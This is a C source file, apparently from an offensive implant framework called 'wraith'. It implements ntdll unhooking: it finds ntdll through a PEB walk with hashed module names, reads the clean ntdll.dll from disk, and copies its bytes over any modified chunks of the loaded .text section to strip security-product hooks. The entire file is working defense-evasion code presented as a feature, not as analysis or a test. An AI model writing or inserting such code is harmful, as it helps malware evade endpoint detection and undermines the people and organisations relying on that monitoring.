/*
 * src/stealth/unhook/unhook.c
 *
 * Implementation of `wr_unhook_ntdll_disk()` and the public-API
 * `wraith_unhook_ntdll()` declared in wr_stealth.h.
 *
 * Algorithm:
 *  1. Find the loaded ntdll base via PEB walk.
 *  2. Open `<system32>\ntdll.dll` and read the file into memory.
 *  3. Locate the `.text` section in both copies (same RVA).
 *  4. Walk the loaded `.text` in 16-byte chunks. Where a chunk
 *  differs from the disk copy, schedule the loaded chunk for
 *  restoration. (A 16-byte granularity is enough to detect
 *  typical inline-hook sled patterns - 5-byte JMPs, 12-byte
 *  mov+jmp absolute, etc. - while keeping the diff cheap.)
 *  5. Flip the affected page(s) to PAGE_READWRITE, splat the disk
 *  bytes, flip back to PAGE_EXECUTE_READ, flush the icache.
 *
 * Notes:
 *  - On x64 ntdll, `.text` is largely RIP-relative and contains
 *  few absolute relocations. Differences between disk and loaded
 *  are dominated by inline hooks; reloc churn is rare enough to
 *  ignore for the canonical unhook use case.
 *  - This is the "legacy" path. wires in a Private ntdll
 *  mapping that avoids editing the loaded copy entirely.
 */

#include "wraith/wraith_stealth.h"
#include "runtime/rt_pebwalk.h"
#include "stealth/hashing/hash_djb2.h"
#include "stealth/unhook/unhook.h"

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>
#include <windows.h>

#define WRAITH_UNHOOK_CHUNK 16

static int read_disk_ntdll(void **out_buf, size_t *out_size)
{
  wchar_t path[MAX_PATH];
  UINT n = GetSystemDirectoryW(path, (UINT)(sizeof(path) /
  sizeof(path[0])));
  if (n == 0 || n + wcslen(L"\\ntdll.dll") + 1 >=
  sizeof(path) / sizeof(path[0])) {
  return -1;
  }
  wcscat(path, L"\\ntdll.dll");

  HANDLE f = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ, NULL,
  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  if (f == INVALID_HANDLE_VALUE) {
  return -1;
  }
  LARGE_INTEGER sz;
  if (!GetFileSizeEx(f, &sz)) {
  CloseHandle(f);
  return -1;
  }
  if (sz.QuadPart <= 0 || sz.QuadPart > 64 * 1024 * 1024) {
  CloseHandle(f);
  return -1;
  }
  void *buf = malloc((size_t)sz.QuadPart);
  if (!buf) {
  CloseHandle(f);
  return -1;
  }
  DWORD got = 0;
  BOOL ok = ReadFile(f, buf, (DWORD)sz.QuadPart, &got, NULL);
  CloseHandle(f);
  if (!ok || got != (DWORD)sz.QuadPart) {
  free(buf);
  return -1;
  }
  *out_buf  = buf;
  *out_size = (size_t)sz.QuadPart;
  return 0;
}

static const IMAGE_SECTION_HEADER *find_text_section(const void *bytes)
{
  const IMAGE_DOS_HEADER *dos = (const IMAGE_DOS_HEADER *)bytes;
  if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
  return NULL;
  }
  const IMAGE_NT_HEADERS64 *nt =
  (const IMAGE_NT_HEADERS64 *)((const uint8_t *)bytes + dos->e_lfanew);
  if (nt->Signature != IMAGE_NT_SIGNATURE) {
  return NULL;
  }
  const IMAGE_SECTION_HEADER *s =
  (const IMAGE_SECTION_HEADER *)((const uint8_t *)&nt->OptionalHeader
  + nt->FileHeader.SizeOfOptionalHeader);
  for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++s) {
  if (memcmp(s->Name, ".text\0\0\0", 8) == 0) {
  return s;
  }
  }
  return NULL;
}

wraith_status_t wr_unhook_ntdll_disk(void)
{
  void *loaded = NULL;
  wraith_status_t rc = wr_pebwalk_find_module(wr_djb2_a("ntdll.dll"), &loaded);
  if (rc != WRAITH_OK || !loaded) {
  return WRAITH_E_RT_PEB_WALK_FAILED;
  }

  void  *disk = NULL;
  size_t disk_size = 0;
  if (read_disk_ntdll(&disk, &disk_size) != 0) {
  return WRAITH_E_UNEXPECTED;
  }

  const IMAGE_SECTION_HEADER *text_disk  = find_text_section(disk);
  const IMAGE_SECTION_HEADER *text_loaded = find_text_section(loaded);
  if (!text_disk || !text_loaded
  || text_disk->VirtualAddress != text_loaded->VirtualAddress) {
  free(disk);
  return WRAITH_E_UNEXPECTED;
  }

  size_t text_size = text_disk->SizeOfRawData < text_loaded->Misc.VirtualSize
  ? text_disk->SizeOfRawData
  : text_loaded->Misc.VirtualSize;

  /* Disk raw `.text` lives at PointerToRawData; loaded `.text` is at
  * VirtualAddress (since SEC_IMAGE doesn't move .text on x64). */
  if ((size_t)text_disk->PointerToRawData + text_size > disk_size) {
  free(disk);
  return WRAITH_E_UNEXPECTED;
  }
  const uint8_t *src  = (const uint8_t *)disk
  + text_disk->PointerToRawData;
  uint8_t  *dst  = (uint8_t *)loaded + text_loaded->VirtualAddress;

  /* Make `.text` writable. We use PAGE_READWRITE per RW->RX hygiene -
  * a brief loss of executability is acceptable for the patch window. */
  DWORD old_prot = 0;
  if (!VirtualProtect(dst, text_size, PAGE_READWRITE, &old_prot)) {
  free(disk);
  return WRAITH_E_MAP_PROTECT_FAILED;
  }

  /* Compare 16-byte chunks; copy disk bytes only where they differ. */
  int patches = 0;
  for (size_t off = 0; off + WRAITH_UNHOOK_CHUNK <= text_size;
  off += WRAITH_UNHOOK_CHUNK) {
  if (memcmp(src + off, dst + off, WRAITH_UNHOOK_CHUNK) != 0) {
  memcpy(dst + off, src + off, WRAITH_UNHOOK_CHUNK);
  ++patches;
  }
  }

  /* Restore the original protection. We don't rely on PAGE_EXECUTE_READ
  * being correct for every page - VirtualProtect with `old_prot` from
  * the call above gives us back what was there. */
  DWORD ignore = 0;
  VirtualProtect(dst, text_size, old_prot, &ignore);
  FlushInstructionCache(GetCurrentProcess(), dst, text_size);

  free(disk);
  return WRAITH_OK;
}

/* Public surface (declared in include/wraith/wraith_stealth.h). */
wraith_status_t wraith_unhook_ntdll(void)
{
#if WRAITH_USE_UNHOOK_NTDLL
  return wr_unhook_ntdll_disk();
#else
  return WRAITH_E_FEATURE_DISABLED;
#endif
}
